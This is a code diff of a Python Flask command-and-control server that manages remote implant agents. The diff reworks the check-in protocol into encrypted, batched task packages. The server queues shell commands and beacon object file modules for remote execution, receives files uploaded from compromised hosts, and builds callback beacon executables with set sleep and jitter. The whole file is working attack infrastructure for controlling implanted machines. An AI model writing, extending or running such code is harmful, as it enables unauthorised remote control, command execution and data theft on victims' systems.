@@ -1,3 +1,9 @@
+#!/usr/bin/env python3
+"""
+C2 Server — structured tasking via the package layer.
+/register, /getbof, /upload remain plain HTTP. /checkin speaks packages.
+"""
+
 import os, re, sys, json, uuid, threading, logging, struct, hashlib, argparse, shlex, subprocess
 from datetime import datetime
 from flask import Flask, request
@@ -6,17 +12,26 @@ from cryptography.hazmat.primitives.asymmetric.ec import (
     ECDH, generate_private_key, SECP256R1, EllipticCurvePublicKey
 )
 from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.exceptions import InvalidTag
+
+from package import (
+    PackageBuilder, PackageReader, parse_batch, build_batch,
+    PKG_CMD_CHECKIN, PKG_CMD_TASK_OUTPUT, PKG_CMD_TASK_ERROR,
+    PKG_CMD_TASK_COMPLETE, PKG_CMD_BOF_OUTPUT,
+    PKG_CMD_EXIT, PKG_CMD_BOF_EXECUTE, PKG_CMD_EXEC_SHELL,
+    PKG_CMD_TASK_BATCH, PKG_FLAG_BATCH, PKG_FLAG_ENCRYPTED,
+    _decrypt_payload, _encrypt_payload, agent_id_hash
+)
+
+# Beacon generator (for BOF argument packing)
+try:
+    from beacon_generate import BeaconPack
+except ImportError:
+    sys.exit("FATAL  beacon_generate.py not found")
 
 # ---------------------------------------------------------------------------
-# Server config — set entirely from CLI args at startup
+# CLI config
 # ---------------------------------------------------------------------------
-_arg_parser = argparse.ArgumentParser(
-    prog="c2server",
-    description="C2 Server",
-    formatter_class=argparse.RawTextHelpFormatter,
-)
+_arg_parser = argparse.ArgumentParser(prog="c2server", description="C2 Server")
 _arg_parser.add_argument("--ip",     default="0.0.0.0",       metavar="ADDR",  help="bind address          (default: 0.0.0.0)")
 _arg_parser.add_argument("--port",   default=8080, type=int,   metavar="PORT",  help="listen port           (default: 8080)")
 _arg_parser.add_argument("--token",  default="",               metavar="TOKEN", help="registration auth token (default: none)")
@@ -32,13 +47,13 @@ USE_HTTPS   = SERVER_ARGS.https
 SSL_CONTEXT = (SERVER_ARGS.cert, SERVER_ARGS.key) if (USE_HTTPS and SERVER_ARGS.cert and SERVER_ARGS.key) else None
 
 # ---------------------------------------------------------------------------
-# Flask app
+# Flask setup
 # ---------------------------------------------------------------------------
 app = Flask(__name__)
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
 
 agents        = {}
-command_queue = {}
+command_queue = {}     # aid -> list of task dicts
 BOF_DIR       = "bofs"
 UPLOAD_DIR    = "uploads"
 STATE_FILE    = "agents.json"
@@ -47,32 +62,16 @@ AUTH_HEADER   = "X-C2-Token"
 _print_lock     = threading.Lock()
 _current_prompt = ""
 
-def encrypt_response(key: bytes, plaintext: bytes) -> bytes:
-    nonce  = os.urandom(12)
-    ct_tag = AESGCM(key).encrypt(nonce, plaintext, associated_data=None)
-    return nonce + ct_tag
- 
- 
-def decrypt_request(key: bytes, data: bytes) -> bytes:
-    if len(data) < 28:            # 12 nonce + 0 ct + 16 tag minimum
-        return b""
-    nonce, ct_tag = data[:12], data[12:]
-    try:
-        return AESGCM(key).decrypt(nonce, ct_tag, associated_data=None)
-    except InvalidTag:
-        return b""
-
 # ---------------------------------------------------------------------------
-# ECDH key exchange
+# ECDH key exchange (same as before)
 # ---------------------------------------------------------------------------
-
 def ecdh_derive_session_key(our_priv, peer_pub_bytes: bytes) -> bytes:
     peer_pub = EllipticCurvePublicKey.from_encoded_point(SECP256R1(), peer_pub_bytes)
     shared   = our_priv.exchange(ECDH(), peer_pub)
     return hashlib.sha256(shared).digest()
 
 # ---------------------------------------------------------------------------
-# Terminal primitives
+# Terminal primitives (unchanged, except minor additions)
 # ---------------------------------------------------------------------------
 W  = 72
 HR = "─" * W
@@ -183,37 +182,54 @@ def agent_status(dt):
     return c("DEAD", RED)
 
 # ---------------------------------------------------------------------------
-# State persistence
+# New agent structure (with task tracking)
 # ---------------------------------------------------------------------------
+def new_agent(key: bytes) -> dict:
+    return {
+        "key":            key,
+        "last_seen":      datetime.now(),
+        "registered":     datetime.now(),
+        "output_history": [],        # list of {task_id, timestamp, output}
+        "last_output":    "",
+        "command_count":  0,
+        "bytes_sent":     0,
+        "bytes_received": 0,
+        "task_id_counter": 0,
+        "pending_tasks":  [],        # list of task dicts
+        "in_flight":      {},        # task_id -> task dict (for correlation)
+    }
 
+# ---------------------------------------------------------------------------
+# Persistence (adapted)
+# ---------------------------------------------------------------------------
 def save_state():
     try:
-        with open(STATE_FILE, "w") as f:
-            json.dump(
-                {
-                    aid: {
-                        "key":            a["key"].hex(),
-                        "last_seen":      a["last_seen"].isoformat(),
-                        "registered":     a["registered"].isoformat(),
-                        "output_history": [
-                            {
-                                "timestamp": entry["timestamp"].isoformat(),
-                                "output":    entry["output"],
-                            }
-                            for entry in a["output_history"]
-                        ],
-                        "last_output":    a["last_output"],
-                        "command_count":  a["command_count"],
-                        "bytes_sent":     a["bytes_sent"],
-                        "bytes_received": a["bytes_received"],
+        data = {}
+        for aid, a in agents.items():
+            data[aid] = {
+                "key":            a["key"].hex(),
+                "last_seen":      a["last_seen"].isoformat(),
+                "registered":     a["registered"].isoformat(),
+                "output_history": [
+                    {
+                        "task_id":   entry.get("task_id", 0),
+                        "timestamp": entry["timestamp"].isoformat(),
+                        "output":    entry["output"],
                     }
-                    for aid, a in agents.items()
-                },
-                f, indent=2
-            )
+                    for entry in a["output_history"]
+                ],
+                "last_output":    a["last_output"],
+                "command_count":  a["command_count"],
+                "bytes_sent":     a["bytes_sent"],
+                "bytes_received": a["bytes_received"],
+                "task_id_counter": a["task_id_counter"],
+                "pending_tasks":  a["pending_tasks"],   # already serialisable
+                "in_flight":      a["in_flight"],       # task_id -> task dict
+            }
+        with open(STATE_FILE, "w") as f:
+            json.dump(data, f, indent=2)
     except Exception as e:
         async_log(f"State save failed: {e}", "err")
-
 
 def load_state():
     if not os.path.exists(STATE_FILE):
@@ -229,6 +245,7 @@ def load_state():
                     "registered":     datetime.fromisoformat(state["registered"]),
                     "output_history": [
                         {
+                            "task_id":   entry.get("task_id", 0),
                             "timestamp": datetime.fromisoformat(entry["timestamp"]),
                             "output":    entry["output"],
                         }
@@ -238,8 +255,11 @@ def load_state():
                     "command_count":  state.get("command_count", 0),
                     "bytes_sent":     state.get("bytes_sent", 0),
                     "bytes_received": state.get("bytes_received", 0),
+                    "task_id_counter": state.get("task_id_counter", 0),
+                    "pending_tasks":  state.get("pending_tasks", []),
+                    "in_flight":      state.get("in_flight", {}),
                 }
-                command_queue[aid] = None
+                command_queue[aid] = []
             except Exception as e:
                 async_log(f"Failed to restore agent {aid[:8]}: {e}", "warn")
         if agents:
@@ -247,23 +267,9 @@ def load_state():
     except Exception as e:
         async_log(f"Failed to load state: {e}", "err")
 
-
-def new_agent(key: bytes) -> dict:
-    return {
-        "key":            key,
-        "last_seen":      datetime.now(),
-        "registered":     datetime.now(),
-        "output_history": [],
-        "last_output":    "",
-        "command_count":  0,
-        "bytes_sent":     0,
-        "bytes_received": 0,
-    }
-
 # ---------------------------------------------------------------------------
-# Flask routes
+# Registration (unchanged)
 # ---------------------------------------------------------------------------
-
 @app.route("/register", methods=["POST"])
 def route_register():
     beacon_pub_bytes = request.data
@@ -290,7 +296,7 @@ def route_register():
 
     aid                = str(uuid.uuid4())
     agents[aid]        = new_agent(session_key)
-    command_queue[aid] = None
+    command_queue[aid] = []
 
     async_log(
         f"Agent registered  id={c(aid[:8], CYAN)}  "
@@ -300,53 +306,9 @@ def route_register():
     save_state()
     return server_pub_bytes + aid.encode(), 200, {"Content-Type": "application/octet-stream"}
 
-
-@app.route("/checkin/<aid>", methods=["POST"])
-def route_checkin(aid):
-    if aid not in agents:
-        return b"unknown", 404
-
-    a   = agents[aid]
-    key = a["key"]
-    a["last_seen"] = datetime.now()
-
-    plain = decrypt_request(key, request.data)
-    raw   = plain.decode("utf-8", errors="ignore").strip()
-
-    if raw:
-        a["bytes_received"] += len(request.data)
-        a["output_history"].append({"timestamp": datetime.now(), "output": raw})
-        a["last_output"] = raw
-
-        lines = [
-            f"\n{c(HL, DIM)}",
-            f"  {c('OUTPUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  {c(ts(), GREY)}",
-            c(HR, DIM),
-        ]
-        for line in raw.splitlines():
-            lines.append(f"  {line}")
-        lines.append(c(HR, DIM))
-        async_output(lines)
-
-    cmd = command_queue.get(aid)
-    if cmd:
-        command_queue[aid]  = None
-        a["command_count"] += 1
-        a["bytes_sent"]    += len(cmd)
-        preview = cmd[:55] + ("..." if len(cmd) > 55 else "")
-        async_log(f"Dispatch  {c(aid[:8], CYAN)}  {c(preview, DIM)}", "send")
-        response = encrypt_response(key, cmd.encode())
-        if cmd == "KILL":
-            # Remove agent from state after dispatching — it won't check in again
-            agents.pop(aid, None)
-            command_queue.pop(aid, None)
-            save_state()
-            async_log(f"Agent removed  {c(aid[:8], CYAN)}", "ok")
-        return response, 200, {"Content-Type": "application/octet-stream"}
-
-    return encrypt_response(key, b""), 200
-
-
+# ---------------------------------------------------------------------------
+# BOF download (unchanged)
+# ---------------------------------------------------------------------------
 @app.route("/getbof/<aid>/<name>", methods=["POST"])
 def route_getbof(aid, name):
     if aid not in agents:
@@ -362,23 +324,25 @@ def route_getbof(aid, name):
 
     if not os.path.exists(path):
         async_log(f"BOF not found: {base}", "err")
-        return encrypt_response(key, b"not found"), 404
+        return _encrypt_payload(key, b"not found"), 404
 
     with open(path, "rb") as f:
-        data = f.read()
+        bof_data = f.read()
 
-    agents[aid]["bytes_sent"] += len(data)
-    async_log(f"BOF served  {c(base, CYAN)}  {fmt_bytes(len(data))}  to {c(aid[:8], CYAN)}", "down")
-    return encrypt_response(key, data), 200, {"Content-Type": "application/octet-stream"}
+    agents[aid]["bytes_sent"] += len(bof_data)
+    async_log(f"BOF served  {c(base, CYAN)}  {fmt_bytes(len(bof_data))}  to {c(aid[:8], CYAN)}", "down")
+    return _encrypt_payload(key, bof_data), 200, {"Content-Type": "application/octet-stream"}
 
-
+# ---------------------------------------------------------------------------
+# File upload (unchanged)
+# ---------------------------------------------------------------------------
 @app.route("/upload/<aid>/<filename>", methods=["POST"])
 def route_upload(aid, filename):
     if aid not in agents:
         return b"unknown", 404
 
     key   = agents[aid]["key"]
-    plain = decrypt_request(key, request.data)
+    plain = _decrypt_payload(key, request.data)
     dest  = os.path.join(UPLOAD_DIR, aid[:8])
     os.makedirs(dest, exist_ok=True)
     with open(os.path.join(dest, filename), "wb") as f:
@@ -386,20 +350,149 @@ def route_upload(aid, filename):
 
     agents[aid]["bytes_received"] += len(request.data)
     async_log(f"Upload  {c(filename, CYAN)}  {fmt_bytes(len(plain))}  from {c(aid[:8], CYAN)}", "up")
-    return encrypt_response(key, b"OK"), 200
+    return _encrypt_payload(key, b"OK"), 200
 
 # ---------------------------------------------------------------------------
-# BOF argument packing
+# /checkin – package‑aware
 # ---------------------------------------------------------------------------
-try:
-    from beacon_generate import BeaconPack
-except ImportError:
-    sys.exit("FATAL  beacon_generate.py not found")
+@app.route("/checkin/<aid>", methods=["POST"])
+def route_checkin(aid):
+    if aid not in agents:
+        return b"unknown", 404
+
+    a   = agents[aid]
+    key = a["key"]
+    a["last_seen"] = datetime.now()
+
+    # 1. Decrypt and parse the top‑level package
+    try:
+        top = PackageReader(request.data, key)
+    except Exception as e:
+        async_log(f"Bad package from {aid[:8]}: {e}", "err")
+        return b"bad request", 400
+
+    # 2. Process sub‑packages (batch or single)
+    if top.flags & PKG_FLAG_BATCH:
+        readers = parse_batch(top.payload, key)
+    else:
+        readers = [top]
+
+    for reader in readers:
+        _process_incoming_package(aid, a, reader)
+
+    # 3. Build response: batch of pending tasks
+    pending = a["pending_tasks"]
+    sub_packages = []
+
+    for task in list(pending):    # copy because we'll clear
+        task_id = task["task_id"]
+        pkg = None
+        if task["type"] == "shell":
+            pkg = PackageBuilder(PKG_CMD_EXEC_SHELL, request_id=task_id,
+                                 encrypt=True, agent_id=aid)
+            pkg.add_string(task["cmd"])
+        elif task["type"] == "bof":
+            pkg = PackageBuilder(PKG_CMD_BOF_EXECUTE, request_id=task_id,
+                                 encrypt=True, agent_id=aid)
+            pkg.add_string(task["name"])
+            pkg.add_string(task["args_hex"])
+        elif task["type"] == "kill":
+            pkg = PackageBuilder(PKG_CMD_EXIT, request_id=task_id,
+                                 encrypt=True, agent_id=aid)
+            # no payload
+
+        if pkg:
+            sub_packages.append(pkg)
+            a["in_flight"][str(task_id)] = task
+            a["command_count"] += 1
+
+    # Clear pending
+    a["pending_tasks"] = []
+
+    # Build batch package (or empty checkin if nothing to send)
+    if sub_packages:
+        wire = build_batch(PKG_CMD_TASK_BATCH, sub_packages, key, agent_id=aid)
+        a["bytes_sent"] += len(wire)
+        save_state()
+        return wire, 200, {"Content-Type": "application/octet-stream"}
+    else:
+        # Send empty encrypted payload (the agent will decrypt to nothing)
+        plain = b""
+        wire = _encrypt_payload(key, plain)
+        a["bytes_sent"] += len(wire)
+        save_state()
+        return wire, 200, {"Content-Type": "application/octet-stream"}
+
+
+def _process_incoming_package(aid, agent, reader: PackageReader):
+    """Handle one incoming sub‑package."""
+    # Accumulate raw bytes for stats
+    agent["bytes_received"] += len(reader._raw_payload)  # approximate
+
+    cmd = reader.command
+    tid = reader.request_id
+
+    if cmd == PKG_CMD_TASK_OUTPUT:
+        output = reader.read_string()
+        _record_output(agent, tid, output)
+        _mark_task_complete(agent, tid)
+        # Display
+        lines = [
+            f"\n{c(HL, DIM)}",
+            f"  {c('OUTPUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  {c(ts(), GREY)}  task={tid}",
+            c(HR, DIM),
+        ]
+        for line in output.splitlines():
+            lines.append(f"  {line}")
+        lines.append(c(HR, DIM))
+        async_output(lines)
+
+    elif cmd == PKG_CMD_TASK_ERROR:
+        error_code = reader.read_int32()
+        async_log(f"Agent {aid[:8]} task {tid} error {error_code}", "err")
+        _mark_task_complete(agent, tid)
+
+    elif cmd == PKG_CMD_TASK_COMPLETE:
+        _mark_task_complete(agent, tid)
+
+    elif cmd == PKG_CMD_BOF_OUTPUT:
+        output = reader.read_string()
+        _record_output(agent, tid, "[BOF] " + output)
+        _mark_task_complete(agent, tid)
+        lines = [
+            f"\n{c(HL, DIM)}",
+            f"  {c('BOF OUT', BOLD + WHITE)}  {c(aid[:8], CYAN)}  task={tid}",
+            c(HR, DIM),
+        ]
+        for line in output.splitlines():
+            lines.append(f"  {line}")
+        lines.append(c(HR, DIM))
+        async_output(lines)
+
+    elif cmd == PKG_CMD_CHECKIN:
+        # Empty checkin, nothing to do
+        pass
+
+    # Add other commands if needed
+
+
+def _record_output(agent, task_id, output):
+    agent["output_history"].append({
+        "task_id": task_id,
+        "timestamp": datetime.now(),
+        "output": output,
+    })
+    agent["last_output"] = output
+    # Keep only last 200 entries
+    if len(agent["output_history"]) > 200:
+        agent["output_history"] = agent["output_history"][-200:]
+
+def _mark_task_complete(agent, task_id):
+    agent["in_flight"].pop(str(task_id), None)
 
 # ---------------------------------------------------------------------------
-# CLI commands
+# CLI commands (adapted for new task model)
 # ---------------------------------------------------------------------------
-
 def cmd_list():
     header("AGENTS")
     if not agents:
@@ -410,6 +503,8 @@ def cmd_list():
         (8,  "STATUS"),
         (14, "LAST SEEN"),
         (8,  "CMDS"),
+        (8,  "PEND"),
+        (8,  "FLY"),
         (12, "SENT"),
         (12, "RECV"),
     )
@@ -419,11 +514,12 @@ def cmd_list():
             (8,  agent_status(a["last_seen"])),
             (14, fmt_age(a["last_seen"])),
             (8,  str(a["command_count"])),
+            (8,  str(len(a["pending_tasks"]))),
+            (8,  str(len(a["in_flight"]))),
             (12, fmt_bytes(a["bytes_sent"])),
             (12, fmt_bytes(a["bytes_received"])),
         )
     section_end()
-
 
 def cmd_bofs():
     header("BOF MODULES", sub=os.path.abspath(BOF_DIR))
@@ -444,7 +540,6 @@ def cmd_bofs():
     print(f"\n  {c(str(len(files)) + ' module(s)', GREY)}")
     section_end()
 
-
 def cmd_info(aid):
     a = agents[aid]
     header("AGENT INFO", sub=aid)
@@ -456,6 +551,8 @@ def cmd_info(aid):
     row("Last seen",      a["last_seen"].strftime("%H:%M:%S") + f"  ({fmt_age(a['last_seen'])})")
     print()
     row("Commands",       str(a["command_count"]))
+    row("Pending tasks",  str(len(a["pending_tasks"])))
+    row("In‑flight tasks", str(len(a["in_flight"])))
     row("Output entries", str(len(a["output_history"])))
     row("Bytes sent",     fmt_bytes(a["bytes_sent"]))
     row("Bytes received", fmt_bytes(a["bytes_received"]))
@@ -465,7 +562,6 @@ def cmd_info(aid):
         for line in a["last_output"][:400].splitlines():
             print(f"  {line}")
     section_end()
-
 
 def cmd_stats(aid):
     a      = agents[aid]
@@ -480,7 +576,6 @@ def cmd_stats(aid):
         row("Avg / cmd", fmt_bytes(a["bytes_sent"] / a["command_count"]))
     section_end()
 
-
 def cmd_output(aid, n=10):
     hist = agents[aid]["output_history"]
     if not hist:
@@ -489,26 +584,16 @@ def cmd_output(aid, n=10):
     entries = hist[-n:]
     header("OUTPUT HISTORY", sub=f"showing {len(entries)} of {len(hist)}")
     for entry in entries:
-        print(f"  {c(entry['timestamp'].strftime('%H:%M:%S'), GREY)}")
+        tid = entry.get("task_id", "?")
+        print(f"  {c(entry['timestamp'].strftime('%H:%M:%S'), GREY)}  task={tid}")
         print(c("  " + HR, DIM))
         for line in entry["output"].splitlines():
             print(f"  {line}")
         print()
     section_end()
 
-
 def cmd_generate(args_str):
-    """
-    Build a beacon binary from the console without touching any config file.
-
-    Usage:
-      generate [--ip ADDR] [--port PORT] [--ua STRING] [--token STRING]
-               [--sleep MS] [--jitter MS] [--https] [--out NAME]
-
-    All flags are optional; defaults match the server's own startup values.
-    The server address and port default to whatever this server is listening on,
-    so a plain `generate` with no flags just works for a local test.
-    """
+    """Beacon builder — unchanged from original."""
     gen = argparse.ArgumentParser(prog="generate", add_help=False, exit_on_error=False)
     gen.add_argument("--ip",     default=LISTEN_IP  if LISTEN_IP != "0.0.0.0" else "127.0.0.1")
     gen.add_argument("--port",   default=str(LISTEN_PORT))
@@ -522,10 +607,9 @@ def cmd_generate(args_str):
     try:
         gargs = gen.parse_args(shlex.split(args_str) if args_str else [])
     except (argparse.ArgumentError, SystemExit):
-        log("usage: generate [--ip X] [--port X] [--ua X] [--token X] [--sleep X] [--jitter X] [--https] [--out X]", "err")
+        log("usage: generate [--ip X] [--port X] ...", "err")
         return
 
-    # Locate build.bat relative to this script
     script_dir = os.path.dirname(os.path.abspath(__file__))
     bat        = os.path.join(script_dir, "..", "agent", "build.bat")
     bat        = os.path.normpath(bat)
@@ -535,7 +619,6 @@ def cmd_generate(args_str):
         return
 
     https_flag = "1" if gargs.https else "0"
-
     call = [bat, gargs.ip, gargs.port, gargs.ua, gargs.token,
             gargs.sleep, gargs.jitter, https_flag, gargs.out]
 
@@ -548,11 +631,8 @@ def cmd_generate(args_str):
 
     agent_dir  = os.path.normpath(os.path.join(script_dir, "..", "agent"))
     build_dir  = os.path.join(agent_dir, "build")
-    final_out  = gargs.out                              # e.g. beacon.exe
-    tmp_out    = "_tmp_" + final_out                    # build to this first
+    tmp_out    = "_tmp_" + gargs.out
 
-    # Build to a temp filename so the linker never touches the live binary.
-    # Once the build succeeds, atomically replace the real file.
     if os.name == "nt":
         invoke = ["cmd", "/c", bat, gargs.ip, gargs.port, gargs.ua,
                   gargs.token, gargs.sleep, gargs.jitter, https_flag, tmp_out]
@@ -561,20 +641,14 @@ def cmd_generate(args_str):
                   gargs.token, gargs.sleep, gargs.jitter, https_flag, tmp_out]
 
     try:
-        result = subprocess.run(
-            invoke,
-            capture_output=True,
-            text=True,
-            cwd=agent_dir,
-        )
+        result = subprocess.run(invoke, capture_output=True, text=True, cwd=agent_dir)
     except Exception as e:
         log(f"Failed to invoke build.bat: {e}", "err")
         return
 
     if result.returncode == 0:
-        # Rename temp -> final (overwrites on Windows too via os.replace)
         tmp_path   = os.path.join(build_dir, tmp_out)
-        final_path = os.path.join(build_dir, final_out)
+        final_path = os.path.join(build_dir, gargs.out)
         try:
             os.replace(tmp_path, final_path)
             log(f"Built  {c(final_path, CYAN)}", "ok")
@@ -594,32 +668,32 @@ def cmd_help():
     header("COMMAND REFERENCE")
     sections = [
         ("GLOBAL", [
-            ("list",                      "list all agents"),
+            ("list",                      "list all agents (shows PEND/FLY counts)"),
             ("bofs",                      "list available BOF modules"),
-            ("generate [flags]",          "build a beacon binary (see below)"),
+            ("generate [flags]",          "build a beacon binary"),
             ("use <id>",                  "select agent by full or partial ID"),
             ("clear",                     "clear the terminal"),
             ("help",                      "show this reference"),
             ("exit",                      "shutdown server"),
         ]),
         ("AGENT  (requires: use <id>)", [
-            ("shell <cmd>",               "execute shell command"),
-            ("bof <name> [args]",         "execute BOF module"),
-            ("output [n]",                "show last N outputs  (default 10)"),
-            ("info",                      "agent details + session key"),
+            ("shell <cmd>",               "execute shell command (queued)"),
+            ("bof <name> [args]",         "execute BOF module (queued)"),
+            ("output [n]",                "show last N outputs (with task IDs)"),
+            ("info",                      "agent details + queue status"),
             ("stats",                     "session statistics"),
-            ("kill",                      "terminate the agent process and remove it"),
+            ("kill",                      "terminate the agent process"),
             ("back",                      "deselect agent"),
         ]),
-        ("GENERATE FLAGS  (all optional)", [
-            ("--ip ADDR",                 f"C2 server IP the beacon calls home to  (default: server listen IP)"),
-            ("--port PORT",               f"C2 server port                          (default: {LISTEN_PORT})"),
+        ("GENERATE FLAGS", [
+            ("--ip ADDR",                 f"C2 server IP   (default: {LISTEN_IP})"),
+            ("--port PORT",               f"C2 server port (default: {LISTEN_PORT})"),
             ("--ua STRING",               "HTTP User-Agent string"),
             ("--token STRING",            "registration auth token"),
-            ("--sleep MS",                "beacon check-in interval in ms          (default: 5000)"),
-            ("--jitter MS",               "sleep jitter in ms                      (default: 3000)"),
-            ("--https",                   "enable HTTPS in the beacon"),
-            ("--out NAME",                "output filename                         (default: beacon.exe)"),
+            ("--sleep MS",                "beacon interval in ms"),
+            ("--jitter MS",               "sleep jitter in ms"),
+            ("--https",                   "enable HTTPS in beacon"),
+            ("--out NAME",                "output filename"),
         ]),
         ("BOF ARGUMENT TYPES", [
             ("s:<value>",                 "UTF-8 string"),
@@ -638,11 +712,43 @@ def cmd_help():
 
 
 def send_cmd(aid, cmd):
-    command_queue[aid] = cmd
-    log(f"Queued  agent={c(aid[:8], CYAN)}", "info")
-
+    """Queue a shell command with a new task ID."""
+    if aid not in agents:
+        log("agent not found", "err")
+        return
+    a = agents[aid]
+    task_id = a["task_id_counter"] = a["task_id_counter"] + 1
+    task = {"type": "shell", "cmd": cmd, "task_id": task_id}
+    a["pending_tasks"].append(task)
+    log(f"Queued shell  agent={c(aid[:8], CYAN)}  task={task_id}  cmd={c(cmd, DIM)}", "info")
 
 def send_bof(aid, name, args_str=""):
+    """Queue a BOF task (embeds the .obj file directly)."""
+    if aid not in agents:
+        log("agent not found", "err")
+        return
+
+    a = agents[aid]
+
+    # Locate the BOF file
+    base = os.path.basename(name)
+    for suffix in (".obj", ".o"):
+        if base.endswith(suffix):
+            base = base[:-len(suffix)]
+            break
+    path = os.path.join(BOF_DIR, base + ".obj")
+    if not os.path.exists(path):
+        log(f"BOF not found: {base}", "err")
+        return
+
+    try:
+        with open(path, "rb") as f:
+            bof_data = f.read()
+    except Exception as e:
+        log(f"Failed to read BOF: {e}", "err")
+        return
+
+    # Build arg hex
     bp = BeaconPack()
     for token in (args_str or "").split():
         if ":" in token:
@@ -652,12 +758,23 @@ def send_bof(aid, name, args_str=""):
             elif t == "i": bp.addint(int(v))
             elif t == "h": bp.addshort(int(v))
             else:
-                log(f"Unknown arg type '{t}'  valid: s / w / i / h", "err")
+                log(f"Unknown arg type '{t}'", "err")
                 return
         else:
             bp.addstr(token)
-    send_cmd(aid, f"BOF:{name}:{bp.getbuffer().hex()}")
+    args_hex = bp.getbuffer().hex()
 
+    # Create task
+    task_id = a["task_id_counter"] = a["task_id_counter"] + 1
+    task = {
+        "type": "bof",
+        "name": base,               # human‑readable name
+        "bof_data": bof_data.hex(), # hex for JSON serialisation, will be converted back
+        "args_hex": args_hex,
+        "task_id": task_id,
+    }
+    a["pending_tasks"].append(task)
+    log(f"Queued BOF  agent={c(aid[:8], CYAN)}  task={task_id}  name={c(base, CYAN)}", "info")
 
 def resolve_agent(partial):
     matches = [a for a in agents if a.startswith(partial)]
@@ -748,9 +865,13 @@ def interactive_shell():
                 elif cmd == "stats":
                     cmd_stats(current)
                 elif cmd == "kill":
-                    command_queue[current] = "KILL"
-                    log(f"Kill queued for {c(current[:8], CYAN)}  (takes effect on next checkin)", "warn")
-                    current = None   # deselect so prompt doesn't show a dead agent
+                    # Queue a kill task
+                    a = agents[current]
+                    task_id = a["task_id_counter"] = a["task_id_counter"] + 1
+                    task = {"type": "kill", "task_id": task_id}
+                    a["pending_tasks"].append(task)
+                    log(f"Kill queued for {c(current[:8], CYAN)}  task={task_id}", "warn")
+                    current = None
             else:
                 log(f"unknown command: {cmd}  (type help)", "err")
 
@@ -784,7 +905,7 @@ if __name__ == "__main__":
         if SSL_CONTEXT:
             log(f"HTTPS enabled  cert={SERVER_ARGS.cert}", "warn")
         else:
-            log("--https requires --cert and --key  (generate with: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=127.0.0.1)", "err")
+            log("--https requires --cert and --key", "err")
             sys.exit(1)
 
     def _flask():
